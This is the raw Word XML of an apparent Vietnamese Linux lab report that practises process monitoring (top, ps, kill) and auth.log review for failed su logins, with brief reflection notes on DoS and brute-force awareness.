        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>là</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> h</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ệ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> th</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ố</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ng th</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ậ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>t thì c</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ầ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>x</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ử</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>lý</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>gì</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>thêm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE564F" w:rsidRDefault="00BE564F">
      <w:r>
        <w:t xml:space="preserve">+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plain text</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE564F" w:rsidRDefault="00BE564F">
      <w:r>
        <w:t xml:space="preserve">+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đặuc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</w:p>
    <w:p w:rsidR="00BE564F" w:rsidRDefault="00BE564F">
      <w:r>
        <w:t xml:space="preserve">+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Owner/Group</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE564F" w:rsidRDefault="00BE564F">
      <w:r>
        <w:t xml:space="preserve">+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</w:p>
    <w:p w:rsidR="00072C86" w:rsidRDefault="00072C86">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r w:rsidRPr="00072C8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0C638816" wp14:editId="7D02DC03">
            <wp:extent cx="5039428" cy="28578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33F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 3 - Process Monitoring</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c tiêu:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Theo dõi process và CPU</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>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n:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 1: T</w:t>
      </w:r>
      <w:r>
        <w:t>ạ</w:t>
      </w:r>
      <w:r>
        <w:t>o process ăn CPU</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>yes &gt; /dev/null &amp;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00984D42" w:rsidRDefault="00984D42">
      <w:r w:rsidRPr="00984D42">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="55FBD212" wp14:editId="5842A4CF">
            <wp:extent cx="3677163" cy="4382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33F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 2: Ki</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>m tra CPU</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00984D42">
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>op</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00984D42" w:rsidRDefault="00984D42">
      <w:r w:rsidRPr="00984D42">
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="763D9D69" wp14:editId="11E28832">
            <wp:extent cx="5486400" cy="28727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33F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 3: Tìm process</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>ps aux --sort=-%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cpu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> | head</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00984D42" w:rsidRDefault="00984D42">
      <w:r w:rsidRPr="00984D42">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="748ADB02" wp14:editId="103FDE9C">
            <wp:extent cx="5486400" cy="6115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33F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 4: L</w:t>
      </w:r>
      <w:r>
        <w:t>ấ</w:t>
      </w:r>
      <w:r>
        <w:t>y PID</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t xml:space="preserve">ps aux | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>grep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> yes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00984D42" w:rsidRDefault="00984D42">
      <w:r w:rsidRPr="00984D42">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6546119F" wp14:editId="154FB0D6">
            <wp:extent cx="5486400" cy="407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33F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 5: Kill process</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>kill -9 PID</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00984D42" w:rsidRDefault="00984D42">
      <w:r w:rsidRPr="00984D42">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="77DB357D" wp14:editId="2820BF68">
            <wp:extent cx="5163271" cy="6287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33F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>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i:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CPU tăng cao</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tìm đư</w:t>
      </w:r>
      <w:r>
        <w:t>ợ</w:t>
      </w:r>
      <w:r>
        <w:t>c process yes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Kill thành công</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Phân tích sau LAB:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006128E9" w:rsidRDefault="00711FBD">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">- Command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>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006128E9" w:rsidRDefault="006128E9">
      <w:r w:rsidRPr="006128E9">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>top</w:t>
      </w:r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 w:rsidRPr="006128E9">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>ps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006128E9">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve"> aux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CPU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r w:rsidRPr="006128E9">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>kill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 w:rsidR="00711FBD">
        <w:br/>
        <w:t xml:space="preserve">- Output </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>nào</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ầ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>n</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>chú</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> ý?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006128E9" w:rsidRDefault="006128E9">
      <w:r>
        <w:t xml:space="preserve">+ PID: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</w:p>
    <w:p w:rsidR="006128E9" w:rsidRDefault="006128E9">
      <w:r>
        <w:t xml:space="preserve">+ %CPU </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>và</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> %MEM: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ngốn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</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006128E9" w:rsidRDefault="006128E9">
      <w:r>
        <w:t xml:space="preserve">+ USER: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</w:p>
    <w:p w:rsidR="006128E9" w:rsidRDefault="006128E9">
      <w:r>
        <w:t xml:space="preserve">+ COMMAND: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file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</w:t>
      </w:r>
      <w:r>
        <w:t>y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gì</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>Có</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ủ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>ro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ả</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>o</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>m</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ậ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>t</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>nào</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="006128E9">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Bị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DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:br/>
        <w:t>- N</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ế</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>u là h</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ệ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> th</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ố</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ng th</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ậ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>t thì c</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ầ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>x</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ử</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>lý</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>gì</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>thêm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006128E9" w:rsidRDefault="006128E9">
      <w:r>
        <w:t xml:space="preserve">+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kill -9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006128E9" w:rsidRDefault="006128E9">
      <w:r>
        <w:t xml:space="preserve">+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</w:p>
    <w:p w:rsidR="006128E9" w:rsidRDefault="006128E9">
      <w:r>
        <w:t xml:space="preserve">+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: CPU, RAM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:rsidR="006128E9" w:rsidRDefault="006128E9">
      <w:r>
        <w:t xml:space="preserve">+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:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 4 - Log Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c tiêu:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Đ</w:t>
      </w:r>
      <w:r>
        <w:t>ọ</w:t>
      </w:r>
      <w:r>
        <w:t>c log và tìm login fail</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Các</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">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n:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 1: Theo dõi auth.log</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>sudo tail -f /var/log/auth.log</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 2: M</w:t>
      </w:r>
      <w:r>
        <w:t>ở</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> terminal m</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Ctrl + Shift + T</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 3: Th</w:t>
      </w:r>
      <w:r>
        <w:t>ử</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> login sai</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>su root</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 4: Nh</w:t>
      </w:r>
      <w:r>
        <w:t>ậ</w:t>
      </w:r>
      <w:r>
        <w:t>p sai password vài l</w:t>
      </w:r>
      <w:r>
        <w:t>ầ</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sai</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> password</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FC50CF" w:rsidRDefault="00FC50CF">
      <w:r w:rsidRPr="00FC50CF">
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A3D2F6E" wp14:editId="241C8D04">
            <wp:extent cx="5486400" cy="80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33F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 5: Quan sát log</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>grep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 'Failed password' /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/log/auth.log</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FC50CF" w:rsidRDefault="00FC50CF">
      <w:r w:rsidRPr="00FC50CF">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="780A00F3" wp14:editId="43C535BA">
            <wp:extent cx="5486400" cy="838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33F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>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i:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Th</w:t>
      </w:r>
      <w:r>
        <w:t>ấ</w:t>
      </w:r>
      <w:r>
        <w:t>y Failed password</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hi</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>u brute force cơ b</w:t>
      </w:r>
      <w:r>
        <w:t>ả</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Bi</w:t>
      </w:r>
      <w:r>
        <w:t>ế</w:t>
      </w:r>
      <w:r>
        <w:t>t đ</w:t>
      </w:r>
      <w:r>
        <w:t>ọ</w:t>
      </w:r>
      <w:r>
        <w:t>c auth.log</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Phân tích sau LAB:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FC50CF" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t xml:space="preserve">- Command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>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002E5977" w:rsidRDefault="00FC50CF">
      <w:r>
        <w:t xml:space="preserve">+ </w:t>
      </w:r>
      <w:r>
        <w:t>tail -f /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/log/auth.log</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E5977">
        <w:t>lệnh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E5977">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E5977">
        <w:t>quan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E5977">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E5977">
        <w:t>trọng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E5977">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E5977">
        <w:t>nhất</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E5977">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E5977">
        <w:t>cho</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E5977">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E5977">
        <w:t>việc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E5977">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E5977" w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>giám</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E5977" w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E5977" w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>sát</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E5977" w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E5977" w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>thời</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E5977" w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E5977" w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>gian</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E5977" w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E5977" w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>thực</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="002E5977" w:rsidRDefault="002E5977">
      <w:r>
        <w:t xml:space="preserve">+ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>grep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">: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 w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>điều</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>tra</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:br/>
        <w:t xml:space="preserve">- Output </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>nào</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ầ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>n</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>chú</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> ý?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002E5977" w:rsidRDefault="002E5977">
      <w:r>
        <w:t xml:space="preserve">+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"Failed"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lâu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
